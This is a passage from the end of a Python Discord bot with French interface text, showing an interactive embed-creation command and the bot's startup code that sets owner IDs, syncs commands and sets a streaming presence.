                field_name_msg = await bot.wait_for('message', timeout=60.0, check=check_author)
                if field_name_msg.content.lower() == 'annuler':
                    await ctx.send("❌ Création de l'embed annulée.")
                    return
                field_name = field_name_msg.content

                await ctx.send("📝 Entrez la valeur du champ :")
                field_value_msg = await bot.wait_for('message', timeout=60.0, check=check_author)
                if field_value_msg.content.lower() == 'annuler':
                    await ctx.send("❌ Création de l'embed annulée.")
                    return
                field_value = field_value_msg.content

                await ctx.send("📏 Voulez-vous que ce champ soit en ligne ? (oui/non) :")
                field_inline_msg = await bot.wait_for('message', timeout=30.0, check=check_author)
                if field_inline_msg.content.lower() == 'annuler':
                    await ctx.send("❌ Création de l'embed annulée.")
                    return
                field_inline = field_inline_msg.content.lower() == 'oui'

                fields.append((field_name, field_value, field_inline))
            else:
                await ctx.send("⚠️ Réponse invalide. Veuillez répondre par `oui` ou `non`.")
        except asyncio.TimeoutError:
            await ctx.send("⏰ Temps écoulé. Veuillez réessayer.")
            return

    # Pied de page
    await ctx.send("📝 Entrez le texte du pied de page (ou tapez `skip` pour passer) :")
    try:
        msg = await bot.wait_for('message', timeout=60.0, check=check_author)
        if msg.content.lower() == 'annuler':
            await ctx.send("❌ Création de l'embed annulée.")
            return
        footer = msg.content if msg.content.lower() != 'skip' else None
    except asyncio.TimeoutError:
        await ctx.send("⏰ Temps écoulé. Veuillez réessayer.")
        return

    # Image
    await ctx.send("🖼️ Entrez l'URL de l'image (ou tapez `skip` pour passer) :")
    try:
        msg = await bot.wait_for('message', timeout=60.0, check=check_author)
        if msg.content.lower() == 'annuler':
            await ctx.send("❌ Création de l'embed annulée.")
            return
        image_url = msg.content if msg.content.lower() != 'skip' else None
    except asyncio.TimeoutError:
        await ctx.send("⏰ Temps écoulé. Veuillez réessayer.")
        return

    embed = discord.Embed(title=title, description=description, color=color)
    for name, value, inline in fields:
        embed.add_field(name=name, value=value, inline=inline)
    if footer:
        embed.set_footer(text=footer)
    if image_url:
        embed.set_image(url=image_url)

    await ctx.send(embed=embed)

    # Confirmation
    await ctx.send("📤 Voulez-vous envoyer cet embed dans un canal spécifique ? (oui/non) :")
    try:
        msg = await bot.wait_for('message', timeout=30.0, check=check_author)
        if msg.content.lower() == 'oui':
            await ctx.send("📌 Mentionnez le canal où vous voulez envoyer l'embed :")
            channel_msg = await bot.wait_for('message', timeout=60.0, check=check_author)
            if channel_msg.content.lower() == 'annuler':
                await ctx.send("❌ Création de l'embed annulée.")
                return
            channel = channel_msg.channel_mentions[0] if channel_msg.channel_mentions else None
            if channel:
                await channel.send(embed=embed)
                await ctx.send(f"Embed envoyé dans {channel.mention}")
            else:
                await ctx.send("⚠️ Mention de canal invalide. Création de l'embed annulée.")
        else:
            await ctx.send("✅ Création de l'embed terminée.")
    except asyncio.TimeoutError:
        await ctx.send("⏰ Temps écoulé. Veuillez réessayer.")

## BOT RUN (DONT TOUCH) AND OWNER ID

bot.anka = "AnKa"

bot.owner_id = 1100569557015466055, 1210241869796347964

def count_commands():
    return len(bot.commands)

command_count = count_commands()

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f'{bot.user} est connecté!')
    print(f'Mon préfix est {bot.command_prefix}')
    print(f'Nombre total de commandes : {command_count}')
    bot.status = discord.Status.dnd
    activity = discord.Activity(type=discord.ActivityType.streaming, url="https://twitch.tv/", name="Soon ...")
    await bot.change_presence(activity=activity)

bot.run(TOKEN)